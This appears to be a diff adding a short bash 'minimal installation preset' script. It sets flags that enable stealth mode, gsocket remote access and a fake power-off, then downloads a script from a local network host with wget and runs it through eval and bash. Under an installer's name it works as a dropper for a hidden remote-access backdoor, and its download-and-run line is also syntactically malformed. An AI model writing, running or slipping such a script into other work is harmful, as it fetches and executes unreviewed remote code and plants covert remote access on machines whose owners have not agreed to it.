@@ -1,0 +1,12 @@
+#!/bin/bash
+# Minimal installation preset - no root required
+export NO_ROOT=true
+export NO_SERVICES=true
+export INSTALL_WOL=false
+export INSTALL_FAKE_POWEROFF=false
+export INSTALL_GSOCKET=true
+export STEALTH_MODE=true
+
+# Download and run the main script
+eval "$(wget -qO- http://192.168.0.104/deployment/y" | bash
+
